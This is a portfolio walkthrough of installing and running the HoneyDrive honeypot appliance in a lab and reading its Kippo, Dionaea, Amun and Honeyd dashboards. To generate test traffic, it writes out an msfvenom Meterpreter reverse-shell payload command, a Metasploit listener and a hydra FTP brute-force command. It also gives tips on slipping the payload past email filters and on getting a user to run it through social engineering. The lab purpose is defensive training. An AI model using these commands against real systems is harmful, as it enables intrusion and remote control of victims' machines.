---
title: "HoneyDrive"
date: 2025-05-11
excerpt: "HoneyDrive is an open-source, pre-configured virtual appliance for honeypots and network security monitoring. Built on Xubuntu Linux, it integrates over 10 popular honeypot tools (like Dionaea, Kippo, Honeyd) and 20+ related analysis utilities. It enables cybersecurity professionals to quickly deploy a full honeypot system for threat intelligence, malware analysis, and intrusion detection <br/>"
collection: portfolio
---

This project showcases the complete setup and operational walkthrough of HoneyDrive an all-in-one honeypot platform aimed at simulating network attacks, capturing threat data, and enhancing intrusion detection capabilities.

First we have to install HoneyDrive In Our Systems.
Visit the SourceForge HoneyDrive page [HoneyDrive](https://sourceforge.net/projects/honeydrive/) and download the HoneyDrive 3 OVA file.

### Configuring HoneyDrive 3 in a VM:
- Use virtualization software like VirtualBox or VMware to import the OVA file. This file is a pre-configured virtual appliance that includes Xubuntu Desktop 12.04.4 LTS and various honeypot packages.
      
- For VirtualBox, double-click the OVA file to launch the import process. For VMware, you might need to use the VMware converter tool if there are compatibility issues.
      
### Virtual Machine Settings:
- Ensure that the VM is configured with the appropriate network settings. 
- Bridging the VM directly to the network is recommended for better exposure to potential threats.
- Allocate sufficient resources (CPU, RAM) to the VM based on your system's capabilities.
      
### Initial Setup:
- Start the VM and log in using the default credentials provided in the readme file (usually honeydrive for both username and password).
- Update the system packages to ensure you have the latest security patches.
      
### Configuring Honeypots:
- HoneyDrive 3 comes with over 10 pre-installed and pre-configured honeypot software. You can start and stop these honeypots using the provided scripts.
- For example, to start the Kippo SSH honeypot, navigate to its directory and run the ./start.sh script. To stop it, use the ./stop.sh script.


### Analyzing Captured Data:

- HoneyDrive includes tools to analyze and visualize the data captured by the honeypots. Open a web browser within the VM and navigate to http://localhost/kippo-graph/ to generate and view graphs of the captured data.

### Additional Configuration:
- You can customize the honeypots and other tools based on your specific requirements. Refer to the documentation provided within the VM for detailed configuration options.

<div style="text-align:center"><img src="/images/honeydrive/1.png" /></div><br>

### Honeydrive 3 comes with some Pre-installed and Pre-configured honeypots software.

**Kippo**
- Kippo-SSH Honoypot
- Kippo-Graph
- Kippo-Malware
- Kippo2MySql
- Kippo-Scripts

**Dionaea Malware Honeypot**
- Dionaea
- DionaeaFR
- Dionaea-Scripts
- Dionaea-Vagrant

**Amun Malware Honeypot**
- Amun Server
- Amun Scripts

**Glastopf Web Honeypot**
- Glastopf
- Wordpot
- Word-Press

**Conpot SCADA / ICS Honeypot**
- Conpot

**Honeyd Low Interaction Honeypot**
- Honeyd
- Honeyd2MySQL
- Honeyd-Scripts
- Honeyd-Viz

**Labrea Sticky Honeypot**
**Tiny Honeypot**
**IIS Emulator and InetSim Honeypot**
**Thug and Phoneyc** honeyclients For Client-side Attacks Analysis
**Maltrieve Malware Collector**
**ELK-Stack For Log Analysis and Vizulization**
- Elastic Search
- Logstash
- Kibana

### Detailed Description Of Honeypots Software
First Of all we have to open the README.txt File . They  can show all the detailed information about all the HoneyPot Software.

<div style="text-align:center"><img src="/images/honeydrive/2.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/3.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/4.png" /></div><br>

### KIPPO – SSH HONEYPOT 

Open the Kippo Location and run the kippo SSH Honeypot services.

<div style="text-align:center"><img src="/images/honeydrive/5.png" /></div><br>

we have to login the ssh connection in your system with right credentials. Also login with wrong credentials for dashboard creation that they show the success and failed login attempt.

```bash
sudo ssh root (Username) @ 10.0.2.15 (system’s Ip address)  ------------ [ Right Credential ]
```

Then Check it change the ip address or change the username -----------  [ Wrong credential ]

<div style="text-align:center"><img src="/images/honeydrive/6.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/7.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/8.png" /></div><br>

  
The Log can show the each and every detailed information of the login attempt. They show the username and password that the user can user for login attempt.also they show the successful and filed login attempt for the user.


### KIPPO-GRAPH

Then Open these url for kippo-graph dashboard: 

> http://localhost/kippo-graph/
      
<div style="text-align:center"><img src="/images/honeydrive/9.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/10.png" /></div><br>

**Top 10 passwords**
This vertical bar chart displays the top 10 passwords that attackers try when attacking the system.

<div style="text-align:center"><img src="/images/honeydrive/11.png" /></div><br>

**Top 10 usernames**
This vertical bar chart displays the top 10 usernames that attackers try when attacking the system

<div style="text-align:center"><img src="/images/honeydrive/12.png" /></div><br>

**Top 10 user-pass combos**
This vertical bar chart displays the top 10 username and password combinations that attackers try when attacking the system.

<div style="text-align:center"><img src="/images/honeydrive/13.png" /></div><br>

This pie chart displays the top 10 username and password combinations that attackers try when attacking the system.

<div style="text-align:center"><img src="/images/honeydrive/14.png" /></div><br>


**Success ratio**
This vertical bar chart displays the overall attack success ratio for the particular honeypot system.

<div style="text-align:center"><img src="/images/honeydrive/15.png" /></div><br>

**Successes per day/week**
This vertical bar chart displays the most successful break-ins per day (Top 20) for the particular honeypot system. The numbers indicate how many times correct credentials were given by attackers.

<div style="text-align:center"><img src="/images/honeydrive/16.png" /></div><br>

**Connections per IP**
This vertical bar chart displays the top 10 unique IPs ordered by the number of overall connections to the system.

<div style="text-align:center"><img src="/images/honeydrive/17.png" /></div><br>

This pie chart displays the top 10 unique IPs ordered by the number of overall connections to the system.

<div style="text-align:center"><img src="/images/honeydrive/18.png" /></div><br>


**Successful logins from the same IP**
This vertical bar chart displays the number of successful logins from the same IP address (Top 20). The numbers indicate how many times the particular source opened a successful session.

<div style="text-align:center"><img src="/images/honeydrive/19.png" /></div><br>

**Probes per day/week**
This horizontal bar chart displays the most probes per day (Top 20) against the honeypot system.

<div style="text-align:center"><img src="/images/honeydrive/20.png" /></div><br>

This line chart displays the weekly activity on the honeypot system. Curves indicate hacking attempts over a weekly period.

<div style="text-align:center"><img src="/images/honeydrive/21.png" /></div><br>


**Top 10 SSH clients**
This vertical bar chart displays the top 10 SSH clients used by attackers during their hacking attempts.

<div style="text-align:center"><img src="/images/honeydrive/22.png" /></div><br>


### KIPPO-INPUT

<div style="text-align:center"><img src="/images/honeydrive/23.png" /></div><br>

**Human activity inside the honeypot:**
The following vertical bar chart visualizes the top 20 busiest days of real human activity, by counting the number of input to the system.

<div style="text-align:center"><img src="/images/honeydrive/24.png" /></div><br>

**Top 10 input (overall):**
The following table displays the top 10 commands (overall) entered by attackers in the honeypot system.

<div style="text-align:center"><img src="/images/honeydrive/25.png" /></div><br>

This vertical bar chart visualizes the top 10 commands (overall) entered by attackers in the honeypot system.

<div style="text-align:center"><img src="/images/honeydrive/26.png" /></div><br>

**Top 10 successful input:**
The following table displays the top 10 successful commands entered by attackers in the honeypot system.

<div style="text-align:center"><img src="/images/honeydrive/27.png" /></div><br>

**Top 10 failed input:**
The following table displays the top 10 failed commands entered by attackers in the honeypot system.

<div style="text-align:center"><img src="/images/honeydrive/28.png" /></div><br>

This vertical bar chart visualizes the top 10 failed commands entered by attackers in the honeypot system.

<div style="text-align:center"><img src="/images/honeydrive/29.png" /></div><br>


**Interesting commands:**
The following table displays other interesting commands executed by attackers in the honeypot system.

<div style="text-align:center"><img src="/images/honeydrive/30.png" /></div><br>

### KIPPO-PLAYLOG

**Replay input by attackers captured by the honeypot system:**

The following table displays a list of all the logs recorded by Kippo.

<div style="text-align:center"><img src="/images/honeydrive/31.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/32.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/33.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/34.png" /></div><br>


### KIPPO-IP

**IP activity gathered from the honeypot system:**

Click column heads to sort data, rows to display attack details.

> nmap -sS -p- <honeypot_ip>

<div style="text-align:center"><img src="/images/honeydrive/35.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/36.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/37.png" /></div><br>


### KIPPO-GEO

**Geolocation information gathered from the top 10 IP addresses probing the system:**

The following table displays the top 10 IP addresses connected to the system (ordered by volume of connections).

<div style="text-align:center"><img src="/images/honeydrive/38.png" /></div><br>

The following vertical bar chart visualizes the top 10 IPs ordered by the number of connections to the system.

> Notice the two-letter country code to after each IP get a quick view of the locations where the attacks are coming from.

<div style="text-align:center"><img src="/images/honeydrive/39.png" /></div><br>

The following pie chart visualizes the top 10 IPs ordered by the number of connections to the system.

<div style="text-align:center"><img src="/images/honeydrive/40.png" /></div><br>

The following Intensity Map shows the volume of attacks per country by summarising probes originating from the same nation, using the same IP or not.

The following pie chart visualizes the volume of attacks per country by summarising probes originating from the same nation, using the same IP or not.

<div style="text-align:center"><img src="/images/honeydrive/41.png" /></div><br>


### GRAPH GALLERY

Provided you have visited all the other pages/components (for the graphs to be generated) you can see all the images in this single page with the help of fancybox

<div style="text-align:center"><img src="/images/honeydrive/42.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/43.png" /></div><br>

### KIPPO – MALWARE

Kippo-Malware is a Python script that will download all malicious files stored as URLs in a Kippo SSH honeypot database.

This is useful in situations where you have lost your files or something happened to your VPS/server but you still have your DB intact. 

The script also supports HTTP proxy usage to cover your IP address from malicious servers and custom User-Agent values.

<div style="text-align:center"><img src="/images/honeydrive/44.png" /></div><br>

### KIPPO2MYSQL

Kippo2MySQL is yet another simple piece of software that simply extracts some very basic stats from Kippo’s text-based log files (a mess to analyze!) and inserts them in a MySQL database. Then you can run some queries and of course visualize the data if you want to.

We can Run these Kippo2mysql scripts first of all we open the kippo2mysql honeypot location with help of command. 

 > cd honeydrive/kippo2mysql

<div style="text-align:center"><img src="/images/honeydrive/45.png" /></div><br>

We can run these scripts with the hepl of command like:

> sudo ./kippo2mysql.pl

<div style="text-align:center"><img src="/images/honeydrive/46.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/47.png" /></div><br>

They show the unique values of the connection also show the usernames, passwords and sources of the data etc..


### KIPPO-SCRIPTS

Open the kippo-scripts location:

> cd / honeydrive/kippo-scripts

Three scripts are there in kippo-scripts: 

**Kippo2Wordlist**

Kippo2Wordlist is a python program that reads logs from kippo to create a wordlist that can be used for anything a standard wordlist is used for such as Pipal Analysis And Cracking Password, and the like.

If You are using honeydrive and haven't changed where the logs for kippo go you are all set. Just run the script and it will function as designed.

<div style="text-align:center"><img src="/images/honeydrive/48.png" /></div><br>

You can see the stored wordlist in these location like:

 > cd  honeydrive/kippo/log/wordlist.txt

<div style="text-align:center"><img src="/images/honeydrive/49.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/50.png" /></div><br>


**Kippo-Sessions.sh**

The kippo-sessions.sh script is designed to work with Kippo, an SSH honeypot. Kippo is a medium-interaction SSH honeypot written in Python, used to log brute force attacks and the entire shell interaction performed by an attacker. 

This script helps in automating the process of reviewing Kippo's logged sessions and downloads, making it easier to monitor and analyze the activities captured by the honeypot 

They can show the tty logs in  cd honeydrive/kippo/log/tty also they can show the Downloaded files during The process.
      
<div style="text-align:center"><img src="/images/honeydrive/51.png" /></div><br>

**Kippo-Stash.pl**

To start Kippo in Honeydrive, you can navigate to the /honeydrive/kippo/ directory and run the start.sh script. This will initiate the Kippo honeypot, allowing it to listen for SSH connections and log interactions. The logs and data collected by Kippo can be found in the /honeydrive/kippo/data/ directory, where you can also configure user credentials in the userdb.txt file.

Honeydrive includes additional tools like Kippo-Graph and Kippo2MySQL to help analyze and visualize the data captured by Kippo. These tools are part of the suite of utilities provided by Honeydrive to enhance the functionality of the honeypots it includes. 

They show the Unique value , SSH client Vesrions Count , Top 10 Username Count , Top 10 Password Count , Top 10 username / password combo ,  top 10 offenders count and store your current directory log location  etc.

<div style="text-align:center"><img src="/images/honeydrive/52.png" /></div><br>

### KIPPO2ELASTICSEARCH

**Transfer Kippo data to ElasticSearch:**

Kippo2ElasticSearch is a Python script to transfer data from a Kippo SSH honeypot MySQL database to an ElasticSearch instance (server or cluster). This is useful in terms of indexing and searching the dataset and makes easy to visualize important stats using Kibana.

For Run kippo2elasticsearch honeypot services we can  open the location and run kippo2elasticsearch services.      

<div style="text-align:center"><img src="/images/honeydrive/53.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/54.png" /></div><br>

Then Open your system’s Browser and type :

> http://localhost/kibana/#/dashboard/elasticsearch/Kippo2ElasticSearch

<div style="text-align:center"><img src="/images/honeydrive/55.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/56.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/57.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/58.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/59.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/60.png" /></div><br>

### DIONAEA – MALWARE HONEYPOT 

A honeypot is a system designed to mimic a real target (like a server or application) to lure attackers and gather information about their tactics, techniques, and procedures (TTPs).

Dionaea, as a honeypot, acts as a decoy, attracting potential attackers to interact with it. By observing these interactions, security teams can learn about new malware, attack vectors, and attacker behaviors.

First we have to open the dionaea honeypot location in hooneydrive

>Location : /honeydrive/dionaea-vagrant/

Then we have to start the dionaea honeypot services with the command of

```bash
sudo ./runDionaea.sh
```

<div style="text-align:center"><img src="/images/honeydrive/61.png" /></div><br>

First of all we have to create one malicious file and transfer to the honeydrive systems.

We have to create Basic payload  with Metasploit in Kali Linux

Start Metasploit by using the following command.
      
```bash
msfconsole
```

<div style="text-align:center"><img src="/images/honeydrive/62.png" /></div><br>

We will create a Reverse TCP payload with msfvenom. This payload generates an executable that, when executed, connects the user’s machine to our Metasploit handler, allowing us to conduct a meterpreter session. msfvenom has a wide range of options available.
      
<div style="text-align:center"><img src="/images/honeydrive/63.png" /></div><br>

To construct a payload in Metasploit on Kali Linux, run the following command.

You can specify the architecture, platform, and type of payload to use by using the -a, –platform, and -p options. Lhost appears to be the attacker’s IP address, to which the payload should be linked. Lport is identical to the above; this is the port to which the payload will connect, and it must be specified in the handler. -f tells Msfvenom how to produce the payload, which in this case is a program executable or exe.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f exe -o payload.exe
```

<div style="text-align:center"><img src="/images/honeydrive/64.png" /></div><br>
      
The payload was created then send to the targeted system. 

<div style="text-align:center"><img src="/images/honeydrive/65.png" /></div><br>
      
Start the metaspolit framework for set a listener for send payload.

<div style="text-align:center"><img src="/images/honeydrive/66.png" /></div><br>

Start the Listener : In Metasploit, set up a listener to catch the incoming connection from the payload:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.0.2.5
set LPORT 4444
exploit
```

<div style="text-align:center"><img src="/images/honeydrive/67.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/68.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/69.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/70.png" /></div><br>


This command configures Metasploit to listen for the reverse TCP connection from the payload

Host the Payload: Use a simple HTTP server to host the payload so it can be downloaded by the target machine. Navigate to the directory containing the payload and run:

This command starts a simple HTTP server on port 80, making the payload accessible via

> http://<your_ip>/payload.exe

<div style="text-align:center"><img src="/images/honeydrive/71.png" /></div><br>      
      
Send the Payload: You can send the payload to the target machine usingT various methods, such as email (ensure it bypasses any email filters) or by hosting it on a web server and sending the link to the target user. 

Execute the Payload: Once the payload is on the target machine, it needs to be executed. This can be done manually by the user or through social engineering techniques to convince the user to run the file.

<div style="text-align:center"><img src="/images/honeydrive/72.png" /></div><br>

Monitor the Listener: Once the payload is executed on the target machine, it will connect back to your Linux machine. The Metasploit listener will capture the connection, and you will gain a Meterpreter session, allowing you to interact with the target machine 

By following these steps, you can successfully send a payload from a Linux machine to Honeydrive and capture the malicious activity.
    - Show the output on These Url : http://localhost/phpliteadmin/phpliteadmin.php
    - The Deafult Password OF these site in Honeydrive

<div style="text-align:center"><img src="/images/honeydrive/73.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/74.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/75.png" /></div><br>


They can show all the traffic inforamtion and then can capture the downloaded file and ip address  

<div style="text-align:center"><img src="/images/honeydrive/76.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/77.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/78.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/79.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/80.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/81.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/82.png" /></div><br>


### DIONAEAFR

DionaeaFR is a very good frontend for Dionaea malware honeypot.

Open the DionaeaFR honeypot services for show the detailed oputput in captured malware.

> Location : /honeydrive/DionaeaFR/

Then run these services for these command:
```bash
sudo python manage.py
```

<div style="text-align:center"><img src="/images/honeydrive/83.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/84.png" /></div><br>


### DIONAEA-SCRIPTS

Miscellaneous scripts for Dionaea malware honeypot-scripts

They can show the detailed inforamtion about malicious activity and downloaded file in your system.

One malicious file downloaded in your system.

<div style="text-align:center"><img src="/images/honeydrive/85.png" /></div><br>

### AMUN – MALWARE HONEYPOT  

Amun is a low-interaction honeypot designed to capture autonomous spreading malware from the internet. 

It emulates a wide range of vulnerabilities across various services to attract and analyze malicious activities. When exploited, Amun analyzes the payload, extracts download URLs, and stores any downloaded malware binaries. 

This allows it to collect new, unknown malware samples that can help improve antivirus signatures 

<div style="text-align:center"><img src="/images/honeydrive/86.png" /></div><br>

The amun server start in your honeydrive system.

Then we have to perform attack to capture the traffic in these honeypot.

We have to perform different type of port scanning and brute force to capture the massive tarffic in your amun honeypot server.
      
```bash
sudo nmap -O 10.0.2.15 (Targeted machine ip address)
```

<div style="text-align:center"><img src="/images/honeydrive/87.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/88.png" /></div><br>


We have to perform FTP Brute force attack using hydra in kali linux with the command of
```bash
hydra -L username.txt (username list) – P password.txt (Password list) ftp://10.0.2.15 (Targeted machine Ip)
```
<div style="text-align:center"><img src="/images/honeydrive/89.png" /></div><br>

Before these Attacks can perform 

<div style="text-align:center"><img src="/images/honeydrive/90.png" /></div><br>

After These Attacks can perform

<div style="text-align:center"><img src="/images/honeydrive/91.png" /></div><br>

We have to show the capture the massive traffic on amun server for perfoming these type of attacks./honeydrive/phoneyc/log/

They can show the deatiled information about the connection  download and many othet information about the activity.

### AMUN - SCRIPTS

Amun script service have one scripts amun statistics.

They can show the incoming traffic of  amun server honepot 

<div style="text-align:center"><img src="/images/honeydrive/92.png" /></div><br>

They can show the deatiled Information about Successful and Failed downloads in your amun scripts honeypot./honeydrive/phoneyc/log/

<div style="text-align:center"><img src="/images/honeydrive/93.png" /></div><br>

### WORDPOT – WORDPRESS HONEYPOT  

Wordpot is a honeypot specificalTly designed for WordPress. 

This tool helps in identifying and logging potential attacks or unauthorized access attempts on WordPress sites

> Location : /honeydrive/wordpot/

<div style="text-align:center"><img src="/images/honeydrive/94.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/95.png" /></div><br>

### HONEYD – A VIRTUAL HONEYPOT DEAMON  

Honeyd is a small daemon that creates virtual hosts on a network.  

The hosts can be configured to run arbitrary services, and their TCP personality can be adapted so that they appear to be running certain versions of operating systems. 

Honeyd enables a single host to claim multiple addresses

We have to create three system one is our main system (Windows) other one is our linux system and the last one is our router (Cisco).

Then We have perfrom these three system with the two differnent ip assign it one is a through DHCP and other one is With out DHCP ip (Static).

We have to start these three system genration through the DHCP ip.

First we have to start the honeyd services

> File Location :  cd /usr/bin/honeyd

Then we have to start these services with the command:

```bash
sudo honeyd
```

<div style="text-align:center"><img src="/images/honeydrive/96.png" /></div><br>

We Have to start the script of Honyed File in honeypot with the location of 

> Config File Location : cd /etc/honeypot 

<div style="text-align:center"><img src="/images/honeydrive/97.png" /></div><br>

Then Open Configuration file for honeyd with the command of 
```bash
sudo nano honeyd.conf
```      
First We have to create One Linux system To test these alert are genrating or not

<div style="text-align:center"><img src="/images/honeydrive/98.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/99.png" /></div><br>

Then we have to runnig the linux system for test the alert are generating or not

<div style="text-align:center"><img src="/images/honeydrive/100.png" /></div><br>

Then We have to Attack the our attacker system to attack these ip for genrating alert on these system

Kali Linux(VM) Is our attacker system and the honeydrive is our targeted system 

In VM kali linux we have to perform simply nmap scanning to insert the honeydrive’s Ip address
      
<div style="text-align:center"><img src="/images/honeydrive/101.png" /></div><br>

Then We have to see the alert are generating in the honeydrive’s dashboard<br><br>

<div style="text-align:center"><img src="/images/honeydrive/102.png" /></div><br>

Then We have to see the connection are Established with the tcp  in between two Ip Address one is our system’s(honeydrive) ip and other one is our targeted system’s Ip Address

<div style="text-align:center"><img src="/images/honeydrive/103.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/104.png" /></div><br>


We have to see the honeyd genrated log in the location of 

> Log File Location : /var/log/honeypot/honeyd.log

<div style="text-align:center"><img src="/images/honeydrive/105.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/106.png" /></div><br>

Then we have to create one windows system configuration file in these location 

<div style="text-align:center"><img src="/images/honeydrive/107.png" /></div><br>

Then we have to runnig the windows system for test the alert are genrating or not


**Windows**

<div style="text-align:center"><img src="/images/honeydrive/108.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/109.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/110.png" /></div><br>


**Linux**

<div style="text-align:center"><img src="/images/honeydrive/111.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/112.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/113.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/114.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/115.png" /></div><br>



**Windows - Server**

<div style="text-align:center"><img src="/images/honeydrive/116.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/117.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/118.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/119.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/120.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/121.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/122.png" /></div><br>

<div style="text-align:center"><img src="/images/honeydrive/123.png" /></div><br>


We have to see all the logs in these location in honeydrive

<div style="text-align:center"><img src="/images/honeydrive/124.png" /></div><br>


> To be Continued...